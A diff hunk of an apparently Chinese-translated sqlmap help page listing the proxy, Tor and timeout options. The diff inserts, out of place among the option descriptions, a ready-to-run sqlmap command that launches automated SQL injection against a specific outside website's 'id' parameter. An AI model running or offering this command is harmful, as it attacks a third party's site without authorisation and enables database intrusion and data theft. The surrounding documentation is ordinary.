@@ -54,6 +54,7 @@ Options:
     --ignore-redirects  忽略重定向尝试
     --ignore-timeouts   忽略连接超时
     --proxy=PROXY       使用代理连接到目标URL
+python sqlmap.py --proxy=127.0.0.1:80 --batch -u "http://www.sallatykka.com/web/index.php?id=31"
     --proxy-cred=PRO..  代理认证凭证(用户名:密码)
     --proxy-file=PRO..  从文件加载代理列表
     --tor               使用Tor匿名网络
